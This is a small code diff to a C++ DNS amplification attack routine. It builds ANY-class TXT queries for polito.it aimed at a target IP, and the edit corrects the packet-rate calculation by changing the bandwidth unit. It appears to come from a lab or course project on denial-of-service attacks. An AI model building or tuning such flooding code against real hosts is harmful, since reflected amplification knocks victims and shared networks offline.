@@ -37,7 +37,7 @@ void DnsAmplification::dns_amplification(IPv4Address target_ip, const IPv4Addres
     dns->add_query(DNS::query("polito.it", DNS::QueryType::TXT, DNS::QueryClass::ANY));
 
     // todo: ho usato un fattore correttivo di 0.65 perchè non tornavano i conti
-    std::chrono::duration<double> time_per_1000_packets((1000*ip.size()*8 / (upload_bandwidth*pow(2,20)))*0.65);
+    std::chrono::duration<double> time_per_1000_packets((1000*ip.size()*8 / (upload_bandwidth*pow(10,6)))*0.65);
 
     for(int i=0; i<(int)(counter/1000); i++){
         auto start = std::chrono::steady_clock::now();
